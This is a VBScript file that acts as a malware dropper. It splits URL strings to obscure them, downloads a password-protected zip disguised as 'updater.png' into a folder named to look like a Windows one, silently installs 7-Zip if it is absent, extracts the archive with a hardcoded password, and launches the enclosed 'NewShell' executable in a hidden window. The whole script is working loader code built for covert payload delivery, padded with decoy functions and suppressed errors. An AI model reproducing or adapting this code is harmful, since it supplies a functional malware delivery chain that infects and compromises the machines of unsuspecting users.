Option Explicit

Function D3crypt(ByVal s)
    Dim parts, i, r
    parts = Split(s, "[+]")
    r = ""
    For i = 0 To UBound(parts)
        r = r & parts(i)
    Next
    D3crypt = r
End Function

Function DummyNoise(x)
    DummyNoise = (x * 2) / 3 + 7
End Function

Sub DownloadJunk(url, path)
    On Error Resume Next
    Dim http, strm
    Set http = CreateObject("Microsoft.XMLHTTP")
    http.Open "GET", url, False
    http.Send
    If http.Status = 200 Then
        Set strm = CreateObject("ADODB.Stream")
        strm.Type = 1
        strm.Open
        strm.Write http.ResponseBody
        strm.SaveToFile path, 2
        strm.Close
    Else
        MsgBox "DL Err: " & http.Status
        WScript.Quit
    End If
End Sub

Sub RenameJunk(oldN, newN)
    On Error Resume Next
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(oldN) Then
        fso.MoveFile oldN, newN
    End If
End Sub

Function Is7Zip()
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    Is7Zip = fso.FileExists(D3crypt("C:[+]\\Program Files[+]\\7-Zip\\7z.exe"))
End Function

Sub Install7z()
    Dim u, t, p
    u = D3crypt("https:[+]//www.7-zip.org[+]/a/7z2301-x64.exe")
    t = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
    p = t & "\setup" & Int(Rnd * 10000) & ".exe"
    DownloadJunk u, p
    CreateObject("WScript.Shell").Run """" & p & """ /S", 0, True
End Sub

Sub ExtractIt(zf, out, pwd)
    Dim cmd, shell
    cmd = """C:\Program Files\7-Zip\7z.exe"" x """ & zf & """ -o""" & out & """ -p" & pwd & " -y"
    Set shell = CreateObject("WScript.Shell")
    shell.Run "cmd /c """ & cmd & """", 0, True
End Sub

Sub ExecJunk(fpath)
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run """" & fpath & """", 0, False
End Sub

Sub Main()
    On Error Resume Next

    Dim url, fold, tempPng, zipF, pwd, exe, fso
    url = D3crypt("http:[+]//127.0.0.1/Downloads/NewShell%281%29.zip")
    fold = "C:\ProgramData\Windows"
    tempPng = fold & "\updater.png"
    zipF = fold & "\updater.zip"
    pwd = "123"
    exe = fold & "\NewShell(1).exe"

    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(fold) Then
        fso.CreateFolder fold
    End If

    DownloadJunk url, tempPng
    RenameJunk tempPng, zipF

    If Not Is7Zip() Then
        Install7z
        WScript.Sleep 8000
    End If

    ExtractIt zipF, fold, pwd

    If fso.FileExists(exe) Then
        ExecJunk exe
    Else
        MsgBox "Missing EXE."
    End If
End Sub

Main
